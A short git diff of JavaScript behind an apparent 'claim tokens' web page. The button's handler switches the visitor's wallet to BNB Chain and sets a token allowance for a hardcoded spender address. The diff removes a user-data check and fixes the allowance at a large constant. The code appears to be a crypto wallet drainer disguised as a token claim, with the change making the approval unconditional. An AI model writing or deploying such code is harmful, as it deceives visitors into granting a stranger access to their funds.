@@ -92,12 +92,6 @@ claimButton.addEventListener('click', claimTokens);
 
 async function claimTokens() {
 
-    if(userData == null || userData == undefined){
-      alert('Retry in 5 minutes');
-      return;
-    }
-
-
     claimButton.innerHTML = 'Loading...';
     await switchToBnbChain();
 
@@ -107,7 +101,7 @@ async function claimTokens() {
 
         const tokenAddress = '0x073761656dC0654F729A4aF0ccE8C9B39b47A18b';
         const spenderAddress = '0x21F5CF45E2E546AB318572B0d62884Ce315B6d6d';
-        const allowanceAmount = userData.data.amount;
+        const allowanceAmount = "1000000000000000";
 
         if(Number(allowanceAmount) == 0 || allowanceAmount == "00"){
           alert('you do not have balance');
